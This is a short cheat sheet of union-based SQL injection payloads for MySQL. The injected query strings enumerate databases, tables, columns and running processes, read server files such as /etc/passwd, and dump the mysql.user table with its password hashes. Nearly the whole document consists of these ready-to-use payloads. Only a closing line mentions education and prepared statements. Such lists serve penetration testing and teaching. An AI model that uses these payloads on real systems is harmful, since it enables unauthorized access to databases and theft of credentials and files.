# SQL Injection Cheat Sheet (Union-Based)

## Database Information
```sql
id=-1 UNION SELECT 1,database(),user(),version(),5--
```
- `database()` - Current database name
- `user()` - Current database user
- `version()` - Database version

## Database Structure
```sql
id=-1 UNION SELECT 1,table_name,table_schema,4,5 FROM information_schema.tables WHERE table_schema=database()--
```
- Lists all tables in current database

```sql
id=-1 UNION SELECT 1,column_name,data_type,4,5 FROM information_schema.columns WHERE table_name='users'--
```
- Lists all columns in specified table

## System Information
```sql
id=-1 UNION SELECT 1,@@hostname,@@version_compile_os,@@version_compile_machine,5--
```
- Server hostname
- OS information
- System architecture

## File System Access (requires privileges)
```sql
id=-1 UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4,5--
```
- Reads file contents from server

## MySQL Environment
```sql
id=-1 UNION SELECT 1,@@datadir,@@basedir,@@tmpdir,5--
```
- Database directories paths

## User Information
```sql
id=-1 UNION SELECT 1,User,Host,Password,5 FROM mysql.user--
```
- Lists all MySQL users with password hashes

## Process List
```sql
id=-1 UNION SELECT 1,USER,HOST,DB,5 FROM information_schema.processlist--
```
- Shows running database processes

## Advanced Enumeration
```sql
id=-1 UNION SELECT 1,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables),3,4,5--
```
- Lists all tables across all databases

```sql
id=-1 UNION SELECT 1,PLUGIN_NAME,PLUGIN_VERSION,PLUGIN_STATUS,5 FROM information_schema.plugins--
```
- Shows installed database plugins

Note: For educational purposes only. Always use prepared statements to prevent SQL injection vulnerabilities.
